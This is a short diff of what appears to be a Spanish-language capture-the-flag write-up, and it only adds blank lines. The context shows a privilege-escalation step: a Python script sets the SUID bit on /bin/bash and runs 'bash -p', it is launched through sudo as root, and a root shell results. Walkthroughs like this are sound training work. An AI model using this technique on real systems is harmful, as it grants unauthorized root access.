@@ -382,10 +382,12 @@ os.system("chmod u+s /bin/bash")
 os.system("bash -p")
 ```
 <p>Lanzamos el programa con el siguiente comando</p>
+
 ```shell
 luisillo@32fca1d7c92f:/opt$ sudo -u root /usr/bin/python3 paw.py 
 ```
 <p>Nos devuelve una bash con el usuario root</p>
+
 ```shell
 root@32fca1d7c92f:/opt# whoami
 root
